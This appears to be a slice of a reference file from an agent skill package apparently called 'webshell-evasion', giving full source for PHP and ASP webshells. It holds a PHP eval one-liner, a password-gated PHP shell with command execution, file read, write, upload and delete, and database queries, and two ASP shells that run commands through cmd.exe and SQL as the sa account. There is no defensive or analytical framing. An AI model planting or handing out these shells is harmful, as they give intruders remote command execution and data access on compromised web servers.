### 3.1 PHP WebShell

**Basic one-liner:**

```php
<?php @eval($_POST['cmd']); ?>
```

**Advanced PHP WebShell with file manager:**

```php
<?php
/**
 * PHP File Manager WebShell
 * Usage: POST pass=xxx&action=cmd&data=base64(cmd)
 */
$pass = 'admin2026';
$action = $_POST['action'] ?? '';
$data = $_POST['data'] ?? '';

if (!isset($_POST['pass']) || $_POST['pass'] !== $pass) {
    header('HTTP/1.1 403 Forbidden');
    die('Access Denied');
}

switch ($action) {
    case 'cmd':
        $cmd = base64_decode($data);
        $output = shell_exec($cmd . ' 2>&1');
        echo '<pre>' . htmlspecialchars($output) . '</pre>';
        break;
    case 'read':
        if (file_exists($data)) {
            echo htmlspecialchars(file_get_contents($data));
        } else { echo 'File not found'; }
        break;
    case 'write':
        list($file, $content) = explode('|', base64_decode($data), 2);
        file_put_contents($file, $content);
        echo 'Written: ' . $file;
        break;
    case 'upload':
        move_uploaded_file($_FILES['file']['tmp_name'], $data);
        echo 'Uploaded to: ' . $data;
        break;
    case 'ls':
        $files = scandir($data ?: '.');
        foreach ($files as $f) {
            $path = ($data ?: '.') . '/' . $f;
            echo (is_dir($path) ? '[D] ' : '[F] ') . $f . ' (' . filesize($path) . ' bytes)<br>';
        }
        break;
    case 'delete':
        if (unlink($data)) { echo 'Deleted: ' . $data; }
        else { echo 'Delete failed'; }
        break;
    case 'info':
        phpinfo();
        break;
    case 'db':
        // Database query via PDO
        $info = json_decode(base64_decode($data), true);
        try {
            $pdo = new PDO("mysql:host={$info['host']};dbname={$info['db']}", $info['user'], $info['pass']);
            $stmt = $pdo->query($info['sql']);
            echo '<table border="1">';
            while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
                echo '<tr>';
                foreach ($row as $col) { echo '<td>' . htmlspecialchars($col) . '</td>'; }
                echo '</tr>';
            }
            echo '</table>';
        } catch (Exception $e) { echo 'DB Error: ' . $e->getMessage(); }
        break;
    default:
        echo '<h1>WebShell Manager</h1>';
        echo '<p>Server: ' . $_SERVER['SERVER_SOFTWARE'] . '</p>';
        echo '<p>PHP: ' . phpversion() . '</p>';
        echo '<p>User: ' . get_current_user() . '</p>';
        echo '<p>OS: ' . PHP_OS . '</p>';
        echo '<p>CWD: ' . getcwd() . '</p>';
        echo '<p>Disabled Functions: ' . ini_get('disable_functions') . '</p>';
}
?>
```

### 3.2 ASP WebShell

**Classic ASP WebShell:**

```
<%@ Language=VBScript %>
<%
Dim cmd, objShell, objExec, output
cmd = Request("cmd")
If cmd <> "" Then
    Set objShell = Server.CreateObject("WScript.Shell")
    Set objExec = objShell.Exec("cmd.exe /c " & cmd)
    output = objExec.StdOut.ReadAll()
    Response.Write("<pre>" & Server.HTMLEncode(output) & "</pre>")
End If
%>
```

**ASP with file operations:**

```
<%
Function ExecuteSQL(sql)
    Dim conn, rs
    Set conn = Server.CreateObject("ADODB.Connection")
    conn.Open "Provider=SQLOLEDB;Data Source=localhost;Initial Catalog=master;User ID=sa;Password=password"
    Set rs = conn.Execute(sql)
    If Not rs.EOF Then ExecuteSQL = rs.GetString()
    rs.Close : conn.Close
End Function

Dim action : action = Request("a")
Select Case action
    Case "cmd"
        Dim o : Set o = Server.CreateObject("WScript.Shell")
        Response.Write "<pre>" & o.Exec("cmd /c " & Request("c")).StdOut.ReadAll() & "</pre>"
    Case "read"
        Dim fso, f : Set fso = Server.CreateObject("Scripting.FileSystemObject")
        Set f = fso.OpenTextFile(Request("f"), 1)
        Response.Write Server.HTMLEncode(f.ReadAll()) : f.Close
    Case "write"
        Set fso = Server.CreateObject("Scripting.FileSystemObject")
        Set f = fso.CreateTextFile(Request("f"), True)
        f.Write(Request("d")) : f.Close
        Response.Write "OK"
    Case "sql"
        Response.Write ExecuteSQL(Request("q"))
    Case Else
        Response.Write "<h1>ASP Shell</h1>"
End Select
%>
```



---
📖 本切片 1/4 结束。 续篇: `skill_view(name="webshell-evasion", file_path="references/chapter-03-multi-language-webshell-02.md")`